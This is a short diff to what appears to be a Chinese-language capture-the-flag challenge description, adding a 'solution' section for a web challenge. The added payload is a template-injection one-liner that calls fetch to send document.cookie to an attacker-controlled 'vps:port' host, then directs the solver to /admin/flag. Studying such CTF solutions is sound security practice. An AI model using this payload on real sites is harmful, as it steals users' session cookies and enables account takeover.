@@ -11,5 +11,15 @@
 
 于是他写出了这样的一个网站，你能帮帮他吗？
 
+## 2.解法
 
-curl http://webserver:8088/admin/view
+> PS 可以放出源码 也可以不放出源码
+> 不放出源码可以说明 flag 在 /admin/flag 下
+
+payload: 
+```js
+{{this.constructor.constructor('fetch("http://vps:port/"+(document.cookie))')()}}
+```
+
+然后访问 `/admin/flag` 即可
+
